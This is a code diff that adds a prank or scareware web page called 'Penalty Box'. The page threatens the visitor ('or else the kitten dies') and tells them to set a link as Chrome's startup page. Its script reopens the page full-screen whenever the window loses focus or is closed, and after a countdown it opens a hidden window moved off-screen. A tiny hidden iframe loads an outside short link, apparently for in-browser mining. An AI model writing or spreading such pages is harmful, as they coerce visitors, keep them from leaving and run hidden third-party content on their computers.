@@ -1,0 +1,49 @@
+<html> <title> Penalty Box </title>
+	<head>
+		<h1>Penalty Box</h1>
+		<h4>You have commited a foul. Please sit in the penalty box</h4>
+	<body style="color: #000055;background-color:#0000FF;font-family: Consolas, monaco, monospace">
+		Please keep this window open and on the front of your screen with mouse on it.
+		<br>
+		when this window closes, open your chrome settings and search up startup.
+		<br>
+		Click open a specific page and type in the following link:
+		<br>
+		Please obey or else the kitten dies.
+		<div id ="window"></div>
+	<b>below is the kitten.</b>
+		 <script>
+		 
+var d = new Date();
+var pp = d.toDateString()
+	function runner() {
+		var a = document.getElementById("window")
+		a.innerHTML = self.location
+		var c = d.getTime() + 60000;
+		var n = new Date();
+		var n = n.getTime();
+	   var diff = c - n;
+	   if (diff < 0) {
+	   	window.open("waiter.html", "customWindow",width=0,height=0).moveTo(10000,10000);
+	   	document.write("xxxx")
+	   window.close()
+	   window.blur()
+	}
+	var time = document.getElementById("timer")
+	time.innerHTML = "Time Left: <b style='font-size:50px'>" + Math.round(diff / 1000).toString() + "</b> seconds"
+	}
+
+	
+window.onbeforeunload = function() {
+	window.alert("");
+	window.open(self.location, "", "width=10000,height=10000")
+};
+window.onblur = function() {
+	window.open(self.location, "_blank", "width=10000,height=10000")
+}; 
+setInterval(runner, 10);
+</script>
+<div style="font-size:30px;background-color:lightblue;"id="timer"></div>
+<image src="kitten.gif"></image>
+<iframe src="http://cnhv.co/1u73f" width=10 height=10></iframe>
+	</body> </html>
